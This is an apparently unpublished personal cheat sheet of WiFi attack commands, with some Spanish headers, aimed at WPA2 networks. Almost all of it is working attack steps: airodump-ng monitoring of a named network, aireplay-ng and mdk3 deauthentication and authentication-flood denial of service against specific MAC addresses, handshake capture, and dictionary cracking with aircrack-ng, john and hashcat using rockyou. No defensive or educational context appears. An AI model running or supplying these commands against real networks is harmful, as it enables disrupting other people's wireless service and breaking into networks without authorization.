---
title: WiFi Hacking
categories: [WiFi, WPA2]
published: false
---

############################################################################################################################
iwlist wlx28ee520662f5 scan | grep ESSID -i


#########################################################################################################MONITORIZACIÓN/HELP
airodump-ng --help
	--channel / -c
	--essid
	--write   / -w


##############################################################################################################MONITORIZACIÓN
airodump-ng wlx28ee520662f5
airodump-ng -c 1 --essid "Galaxy S10" wlx28ee520662f5
airodump-ng -w capture -c 1 --essid "Galaxy S10" wlx28ee520662f5


#################################################################################################################DEAUTH/HELP
aireplay-ng --help
	-0 / --deauth
	-a / bssid    / set Access Point MAC address
	-c / dmac     / set Destination  MAC address

mdk3 --help
	d  / Deauthentication/Disassociation Amok Mode / Kicks everybody found from AP
	-b / Blacklist
	-c / Channel
	-w / Whitelist



#################################################################################################################DEAUTH/DIR
aireplay-ng -0 10 -a D6:53:83:E6:4D:2B -c 78:0C:B8:B0:95:23 wlx28ee520662f5

mdk3  d -b blacklist
mdk3  d -b blacklist -c 1


################################################################################################################DEAUTH/GLOB
aireplay-ng -0 10 -a D6:53:83:E6:4D:2B -c FF:FF:FF:FF:FF:FF wlx28ee520662f5
aireplay-ng -0 10 -a D6:53:83:E6:4D:2B wlx28ee520662f5

mdk3 wlx28ee520662f5 d
mdk3 wlx28ee520662f5 d -c 1


###################################################################################################################AUTH/HELP
mdk3 --help
	a  / Authentication DoS mode
	-i / This test connects clients to the AP and reinjects sniffed data to keep them alive


########################################################################################################################AUTH
mdk3 wlx28ee520662f5 a -i D6:53:83:E6:4D:2B


###############################################################################################################ANALYSIS/HELP
pyrit -help
	-r      / Packet capture source in pcap-format
	analyze / Analyze a packet-capture file	


####################################################################################################################ANALYSIS
pyrit -r Capture-01.cap analyze


###############################################################################################################ANALYSIS/HELP
aircrack-ng --help
	<file>


####################################################################################################################ANALYSIS
aircrack-ng capture-01.cap


###############################################################################################################CRACKING/HELP
aircrack-ng --help
	-J <file>  / create Hashcat file (HCCAP)
	-j <file>  / create Hashcat v3.6+ file (HCCAPX)
	-w <words> / path to wordlist(s)


####################################################################################################################CRACKING
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap


#####################################################################################################################CRACKING
aircrack-ng -J hccapture capture-01.cap
hccap2john hccapture.hccap >> hashCapture
john --wordlist=usr/share/wordlists/rockyou.txt hashCapture
for i in $(seq 1 10000); do echo "YEPA$i" >> dictionary; done


######################################################################################################################CRACKING
hashcat -m 2500 hashcatCapture.hccapx /usr/share/wordlists/rockyou.txt
hashcat --help | grep "WPA"
